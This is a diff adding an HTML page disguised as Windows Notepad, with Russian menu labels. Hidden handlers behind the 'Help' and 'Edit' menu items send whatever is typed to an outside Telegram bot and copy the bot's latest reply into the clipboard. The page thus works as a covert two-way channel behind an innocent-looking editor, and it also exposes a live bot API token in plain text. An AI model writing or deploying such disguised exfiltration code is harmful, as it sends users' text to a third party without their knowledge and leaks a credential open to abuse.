@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Безымянный - Блокнот</title>
+  <link rel="icon" type="image/webp" href="Notepad_Vista_10.webp" sizes="128X128">
+  <link rel="stylesheet" href="css/notepad.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400">
+</head>
+
+<body class="win10">
+  <!-- <header>
+    <img width="19" height="16" alt="Logo" src="img/icon.png">
+    <h1><span id="title-file-name">Untitled</span> - Notepad</h1>
+  </header> -->
+
+  <nav class="menu">
+    <ul>
+      <li id="menu-file">Файл</li>
+      <li id="menu-edit" type="button" onclick = "fetchJSONData()">Правка</li>
+      <li id="menu-format">Формат</li>
+      <li id="menu-view">Вид</li>
+      <li id="menu-help" type="button" onclick="Send_to_bot()">Справка</li>
+    </ul>
+
+    <div class="border" id="secondary"></div>
+    <div class="border" id="primary"></div>
+  </nav>
+
+  <nav class="menu-context file">
+    <div class="area-check">
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+    </div>
+
+    <label id="action-new">Создать</label>
+    <label class="menu-disabled">Открыть&hellip;</label>
+    <label id="action-save">Сохранить</label>
+    <label id="action-save-as">Сохранить как&hellip;</label>
+    <label class="menu-divider menu-disabled">Параметры Страницы&hellip;</label>
+    <label id="action-print">Печать&hellip;</label>
+    <label class="menu-disabled menu-divider">Выход</label>
+  </nav>
+
+  <nav class="menu-context edit">
+    <div class="area-check">
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+      <div class="blank"></div>
+    </div>
+
+    <label class="menu-disabled">Отменить</label>
+    <label class="menu-divider" id="action-cut">Вырезать</label>
+    <label id="action-copy">Копировать</label>
+    <label class="menu-disabled">Вставить</label>
+    <label class="menu-disabled">Удалить</label>
+
+    <label class="menu-disabled menu-divider">Поиск с помощью Bing&hellip;</label>
+    <label class="menu-disabled">Найти&hellip;</label>
+    <label class="menu-disabled">Найти далее&hellip;</label>
+    <label class="menu-disabled">Заменить&hellip;</label>
+    <label class="menu-disabled">Перейти&hellip;</label>
+
+    <label class="menu-divider" id="action-select-all">Выделить всё</label>
+    <label id="action-time-date">Время/Дата</label>
+  </nav>
+
+  <nav class="menu-context format">
+    <div class="area-check">
+      <input type="checkbox" id="word-wrap">
+      <div class="blank"></div>
+    </div>
+    <label for="word-wrap">Перенос по словам</label>
+    <label class="menu-disabled">Шрифт&hellip;</label>
+  </nav>
+
+  <nav class="menu-context view">
+    <div class="area-check">
+      <input type="checkbox" id="status-bar">
+    </div>
+
+    <label for="status-bar" id="action-status-bar">Строка состояния</label>
+  </nav>
+
+  <nav class="menu-context help">
+    <div class="area-check">
+      <div class="blank"></div>
+      <div class="blank"></div>
+    </div>
+    <label id="action-view-help">Посмотреть справку</label>
+    <label class="menu-divider menu-disabled">О программе</label>
+  </nav>
+
+  <div id="area-edit">
+    <textarea id="message" class="no-word-wrap" autocomplete="off" spellcheck="false" autofocus></textarea>
+  </div>
+
+  <div id="area-status-bar">
+    <div></div>
+    <div class="text">
+      Стр <span class="line-number"></span>, стлб <span class="column-number"></span>
+    </div>
+  </div>
+
+  <script async src="js/notepad.js"></script>
+  <script>
+
+            
+      function Send_to_bot() {
+        message = document.getElementById("message").value
+        fetch(`https://api.telegram.org/bot8419192078:AAG_uZFUnKCvFwu_eCVoPzbqRuzFQ9ON1k8/sendMessage?chat_id=1993291944&text=${message}`)
+    }
+
+      function fetchJSONData() {
+  fetch('https://api.telegram.org/bot8419192078:AAG_uZFUnKCvFwu_eCVoPzbqRuzFQ9ON1k8/getUpdates?offset=-1')
+      .then(response => {
+          if (!response.ok) {
+              throw new Error(`HTTP error! Status: ${response.status}`);
+          }
+          return response.json();  
+      })
+      .then(data => {let new_data = data['result'][0]['message']['text'];
+              var copyText = new_data;
+              navigator.clipboard.writeText(copyText);
+          console.log(new_data);
+      })  
+      .catch(error => console.error('Failed to fetch data:', error));
+  }
+
+  </script>
+</body>
+</html>
